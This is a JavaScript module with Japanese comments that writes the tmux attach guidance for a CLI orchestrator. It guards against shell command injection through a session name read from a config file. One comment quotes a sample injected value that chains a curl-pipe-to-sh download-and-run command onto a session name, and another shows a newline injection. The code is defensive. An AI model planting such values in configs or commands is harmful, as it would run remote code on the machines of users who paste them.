// -------------------------------------------------------
// tmux モードの `up` が出すセッション名まわりの案内文（純粋関数）。
//
// bin/vk-orchestrator.js（エントリポイント）に文字列を直書きしていたが、
//   - セッション名は設定ファイル由来（env VK_TMUX_SESSION > config tmux.session）で、
//     `tmux attach -t <セッション名>` という **そのまま貼れるコマンド行** に埋まっていた
//   - bin 直下のロジックはユニットテストから触れない
// という 2 点があったため、判定と文言をこのモジュールへ切り出す（issue #253）。
//
// 案内文は「そのままターミナルに貼ってください」という文脈で読まれる。細工された設定を
// 含むリポジトリを clone した人が案内どおりに貼ると、`tmux.session` に仕込まれた
// `vk-orch; curl -s a.io/x | sh` のような値がそのまま成立してしまう。doctor 側の
// tmux.claudeCommand と同型の問題なので、判定（isShellSafeCommandForDisplay）も
// 文言の型も揃える。
// -------------------------------------------------------

import { stripAnsiAndControlChars, isShellSafeCommandForDisplay } from '../engine/build-command.js';

/**
 * セッション名をコンソールへ表示するための文字列を組み立てる（引用符込み）。
 *
 * 手書きの `"${session}"` をやめて JSON.stringify を使う。手書きだと値に `"` を入れられ、
 * 引用符の外へ出て偽のコンソール行（例: 「✅ …」や別の指示文）を作れるため。
 * JSON.stringify は `"` と `\` をエスケープし、制御文字も `\n` 等の可視表現へ変える。
 *
 * それでも先に stripAnsiAndControlChars を通すのは、値の見た目を素直に読ませるためと、
 * U+2028 / U+2029 を落とすため。この 2 文字は端末では行が割れないが CSS は強制改行として
 * 扱うので、`up` の出力を GitHub の issue へ貼るとブラウザ上で行が割れ、偽の行が独立して
 * 見えてしまう。doctor のレポートと同じ理由なので、除去の線引きも共通ヘルパへ寄せる。
 *
 * 守っている不変条件は「囲い（引用符）を閉じるのは製品側だけで、値の側からは閉じられない」。
 * 全角の `）` などはエスケープされず値の中に見えるが、囲いを閉じられない以上、製品が語って
 * いるように見せることはできない。**この不変条件が効くのは囲いが読み手に見える文脈に限る。**
 * 将来この値をコードフェンスや `<code>` の中、あるいは引用符が意味を持たない／消費される
 * 文脈（シェルの引数例、CSV など）へ入れるときは、同じ判定をやり直すこと。
 *
 * 未設定（undefined / null）は `""` にする。`"undefined"` という実在しない名前を出すと、
 * 利用者がそれを自分の設定値だと誤解するため（formatTmuxAttachGuidance の正規化と揃える）。
 * 通常のセッション名（`vk-orch`）では出力は従来と 1 文字も変わらない。
 * @param {*} session 設定由来のセッション名
 * @returns {string} `"vk-orch"` のような引用符込みの表示文字列
 */
export function formatTmuxSessionLabel(session) {
  return JSON.stringify(stripAnsiAndControlChars(String(session ?? '')));
}

/**
 * 非対話起動時（attach せずに抜けるとき）に出す、セッションへの入り方の案内文。
 *
 * セッション名が tmux のセッション名として正常な文字だけで書かれているときだけ、従来どおり
 * `tmux attach -t <セッション名>` のコマンド行を出す。そうでなければ名前を指定する形の
 * コマンド行は出さず、値の見直しを促す案内へ切り替える（issue #253）。
 *
 * 危険側でも復帰手段は必ず残す。案内を削っただけで利用者が自力で戻れなくなるため。ただし
 * **`tmux ls` は案内しない**。一覧にはセッション名が素で出るので、利用者はそれをコピーして
 * `tmux attach -t <名前>` を自分で組み立てることになり、製品が出さなかった危険なコマンド行を
 * 利用者の手で再現させてしまう。`-t` を付けない `tmux attach` は設定値を一切含まない固定の
 * コマンドで直近のセッションに入れ、複数あっても入ったあと Ctrl-b s の一覧から選べる。
 *
 * 文の順序は「状態 → 今すぐ戻る方法 → 出さない理由 → 設定の見直し」。`npm start` の最終行と
 * して流れる 1 行なので、即時性の高い打つ手を先に置く（診断レポートの「次にやること」欄で
 * 理由から入る doctor の hint とは、読まれる場面が違う）。
 *
 * 原因は断定しない。許可リストは ASCII 限定なので `~/bin` や和文を含む値も落ちるが、
 * それらに「危険な文字が含まれています」と言うと、無い問題を探させることになる。
 * 「扱える文字だけで書かれていない」と事実だけ述べ、危険な例は補足として添える。
 * @param {*} session 設定由来のセッション名（env VK_TMUX_SESSION > config tmux.session）
 * @returns {string} コンソールへ出す 1 行の案内文
 */
export function formatTmuxAttachGuidance(session) {
  const raw = String(session ?? '');
  const label = formatTmuxSessionLabel(raw);
  // 判定は生の値と表示用（制御文字除去後）の両方に掛ける。除去で危険な文字が落ちて
  // 「安全に見える」値をコマンド行へ通さないため（生が不安全ならラベルも不安全扱い）。
  // 安全側は raw をそのまま埋める設計なので、生値側の判定が外れると
  // `vk-orch\n./setup` のような値が改行込みでコマンド行に入り、案内が 2 行に割れる。
  const canShowCommandLine = isShellSafeCommandForDisplay(raw)
    && isShellSafeCommandForDisplay(stripAnsiAndControlChars(raw));
  if (canShowCommandLine) {
    // 安全側は許可リストを通った値しか来ないので、従来どおり値を素のまま埋める。
    return `\`tmux attach -t ${raw}\` で入れます（Ctrl-b d で離脱、切断されても動作継続）。`;
  }
  // 括弧の中身は安全側と 1 文字違わず揃える（同じ場面の同じ補足が違う字面で出ると、
  // 別のことを言っているように読めるため）。Ctrl-b s の案内は括弧へ足さず独立した文にする。
  return `セッション ${label} で動作を続けています。\`tmux attach\` で入れます（Ctrl-b d で離脱、切断されても動作継続）。セッションが複数あるときは、入ったあと Ctrl-b s で一覧から選べます。設定されているセッション名が、tmux のセッション名として扱える文字だけで書かれていないため、名前を指定する attach のコマンドは案内しません（バッククォート \` や \`$\`、\`;\` が含まれていると、貼ったときに別のコマンドまで動いてしまうためです）。config.json の tmux.session（環境変数 VK_TMUX_SESSION）の値を見直してください。設定した覚えのない値なら、そのままにせず削除してください。`;
}
